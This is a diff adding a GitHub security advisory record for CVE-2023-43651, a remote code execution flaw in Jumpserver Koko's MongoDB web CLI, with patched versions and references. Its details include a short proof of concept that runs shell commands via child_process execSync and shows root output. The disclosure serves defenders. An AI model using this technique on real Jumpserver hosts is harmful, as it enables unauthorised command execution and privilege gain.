@@ -1,0 +1,88 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-4r5x-x283-wm96",
+  "modified": "2023-10-24T19:47:50Z",
+  "published": "2023-10-24T19:47:50Z",
+  "aliases": [
+    "CVE-2023-43651"
+  ],
+  "summary": "Jumpserver Koko vulnerable to remote code execution on the host system via MongoDB shell ",
+  "details": "### Impact\n\nAn authenticated user can exploit a vulnerability in MongoDB sessions to execute arbitrary commands, leading to remote code execution. This vulnerability may further be leveraged to gain root privileges on the host system.\n\n### Details\nThrough the WEB CLI interface provided by koko, a user logs into the authorized mongoDB database and exploits the MongoDB session to execute arbitrary commands.\n\n```\nadmin> const { execSync } = require(\"child_process\")\nadmin> console.log(execSync(\"id; hostname;\").toString())\nuid=0(root) gid=0(root) groups=0(root)\njms_koko\nadmin> \n```\n\n### Patches\nSafe versions: \n- v2.28.20\n- v3.7.1 \n\n### Workarounds\nIt is recommended to upgrade the safe versions.\n\nAfter upgrade, you can use the same method to check whether the vulnerability is fixed.\n```\nadmin> console.log(execSync(\"id; hostname;\").toString())\n/bin/sh: line 1: /bin/hostname: Permission denied\n```\n\n### References\nThanks for **Oskar Zeino-Mahmalat** of [Sonar](https://sonarsource.com/) found and report this vulnerability ",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/jumpserver/koko"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "fixed": "2.28.20"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/jumpserver/koko"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.7.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jumpserver/jumpserver/security/advisories/GHSA-4r5x-x283-wm96"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43651"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jumpserver/koko/commit/7d80db95d17c8f42bdf50260dfc21dc2bd0452c2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jumpserver/koko/commit/857f8b9e41f0930dc6190a35d8601fffa5e884e7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jumpserver/koko"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-24T19:47:50Z",
+    "nvd_published_at": "2023-09-27T21:15:10Z"
+  }
+}
